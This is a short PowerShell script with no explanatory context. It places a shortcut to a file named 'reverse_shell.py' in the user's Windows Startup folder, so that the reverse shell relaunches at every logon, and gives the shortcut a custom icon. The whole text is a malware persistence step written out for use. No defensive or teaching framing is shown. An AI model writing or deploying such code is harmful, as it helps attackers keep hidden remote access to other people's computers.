# Set properties and icons for the script
$script = "$env:TEMP\reverse_shell.py"
$shortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\reverse_shell.lnk"
$wshell = New-Object -ComObject WScript.Shell
$shortcut = $wshell.CreateShortcut($shortcut)
$shortcut.TargetPath = $script
$shortcut.IconLocation = "C:\Path\To\Icon.ico"
$shortcut.Save()
